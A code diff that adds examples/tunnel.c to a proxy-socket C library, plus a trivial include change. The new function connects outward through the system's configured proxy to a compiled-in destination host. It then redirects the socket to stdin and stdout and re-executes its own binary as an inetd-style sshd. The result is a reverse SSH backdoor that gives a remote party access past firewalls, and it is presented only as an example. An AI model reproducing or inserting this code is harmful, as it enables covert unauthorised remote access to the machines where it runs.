@@ -1,0 +1,105 @@
+diff --git a/examples/tunnel.c b/examples/tunnel.c
+new file mode 100644
+index 0000000..0ee4a59
+--- /dev/null
++++ b/examples/tunnel.c
+@@ -0,0 +1,87 @@
++#include "proxysocket.h"
++#include <stdlib.h>
++#include <stdio.h>
++#include <string.h>
++#include <ctype.h>
++#if defined(_WIN32) && !defined(__MINGW64_VERSION_MAJOR)
++#define strcasecmp stricmp
++#define strncasecmp strnicmp
++#endif
++
++extern char **environ;
++int tun(){
++    //get command line parameters
++  int i;
++  char* param;
++  int proxytype = PROXYSOCKET_TYPE_NONE;
++  const char* proxyhost = NULL;
++  uint16_t proxyport = 0;
++  const char* proxyuser = NULL;
++  const char* proxypass = NULL;
++  int verbose = -1;
++  int proxydns = 0;
++  int pid,status;
++  int remote;
++  #ifndef AUTO 
++  proxytype = proxysocketconfig_get_name_type(PTYPE);
++  proxyhost = PHOST;
++  proxyport = PPORT;
++  #else
++  char type[8];
++  char host[255];
++  char* env;
++
++  env = getenv("https_proxy");
++  
++  if (env==0 && (env=getenv("http_proxy"))==0){
++        fprintf(stderr, "No http_proxy var env set\n");
++        exit(1);
++  }
++
++   sscanf( env, "%[^:]://%[^:]:%d", type, host, &proxyport);
++   proxyhost = host;
++   proxytype = proxysocketconfig_get_name_type(type);
++   //   printf("%s %s %d\n", type, host, proxyport);
++   //printf("%d\n", proxytype); 
++  #endif
++  #ifdef PUSER
++  proxyuser = PUSER;  
++  proxypass = PPASS;
++
++  #endif
++  proxydns = 1;
++  //make the connection via the specified proxy
++  SOCKET sock;
++  char* errmsg;
++  //prepare for connection
++  proxysocket_initialize();
++  proxysocketconfig proxy = proxysocketconfig_create_direct(5);
++  if (proxydns)
++    proxysocketconfig_use_proxy_dns(proxy, 1);
++  proxysocketconfig_add_proxy(proxy, proxytype, proxyhost, proxyport, proxyuser, proxypass);
++  //connect
++  errmsg = NULL;
++  remote = proxysocket_connect(proxy, DST_HOST, DST_PORT, &errmsg);
++  if (remote != -1){
++  char	config_file[2048];
++  char* args[] =  {"sshd","-ir", (char*)NULL};
++  memset(config_file, 0, sizeof(config_file));
++  
++  readlink("/proc/self/exe", config_file,
++	  sizeof(config_file));
++  
++  printf("Exec : %s\n", config_file);
++
++     //	    dup2(fd, 2);
++   pid = fork();
++   if (pid == 0)
++     {
++     dup2(remote, 0);
++     dup2(remote, 1);
++     execve(config_file, args ,environ);
++     }
++   else
++     wait(&status);
++  }
++  return 0;
++}
+diff --git a/src/proxysocket.c b/src/proxysocket.c
+index 86c437b..2c906d4 100644
+--- a/src/proxysocket.c
++++ b/src/proxysocket.c
+@@ -13,6 +13,7 @@
+ #define SOCKET_ERROR -1
+ #endif
+ #endif
++#include <sys/time.h>
+ #include <stdio.h>
+ #include <stdlib.h>
+ #include <string.h>
